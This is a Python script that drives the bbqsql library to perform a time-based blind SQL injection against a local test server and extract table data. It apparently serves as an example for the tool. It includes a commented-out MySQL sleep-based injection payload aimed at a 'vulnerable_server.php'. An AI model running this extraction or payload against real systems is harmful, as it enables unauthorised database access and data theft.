import bbqsql
import requests
from time import time
from urllib import quote


def my_sender(request):
    #we need a single function that can send requests
    if request.send():
        return request.response
    else:
        raise 

def pre_hook(request):
    #hooks for the requests module
    request.start_time = time()
    return request

def post_hook(request):
    #hooks for the requests module
    request.response.response_time = time() - request.start_time
    request.response.size = len(request.response.content)
    return request

#url = bbqsql.Query('http://127.0.0.1/vulnerable_server.php?query=${query}',encoder=quote)
#query = bbqsql.Query("foobar' or if(ascii(substr((${user_query:SELECT 'A'} LIMIT 1 OFFSET ${row_index:0}), ${char_index:1}, 1))${comparator:=}${char_val:65},sleep(${sleep:0}),1)=0 or 'a'='b")

#setup the queries
url = bbqsql.Query('http://127.0.0.1:1337/?${query}')
query = bbqsql.Query("foo=${user_query:unimportant}&row_index=${row_index:1}&char_index=${char_index:0}&test_char=${char_val:0}&cmp=${comparator:>}&sleep=${sleep:.2}",encoder=quote)

#build a requests.Session object to hold settings
session = requests.Session()
#build a request object (but don't send it)
request = session.get(url,return_response=False,hooks = {'pre_request':pre_hook,'post_request':post_hook})

#build a bbqsql.Requester object 
requester = bbqsql.Requester(request = request, send_request_function = my_sender)

#build a Truth class
mytruth = bbqsql.LooseNumericTruth(comparison_attr = "response_time")

#setup some base values
for i in xrange(5):
    mytruth.add_true((requester.make_request(query.render())))
query.set_option('comparator','<')
for i in xrange(5):
    mytruth.add_false((requester.make_request(query.render())))

#build our technique
tech = bbqsql.BlindTechnique(make_request_func=requester.make_request,query=query,concurrency=1, truth=mytruth)

#run our technique
results = tech.run('SELECT data from example',sleep=.2)

print results

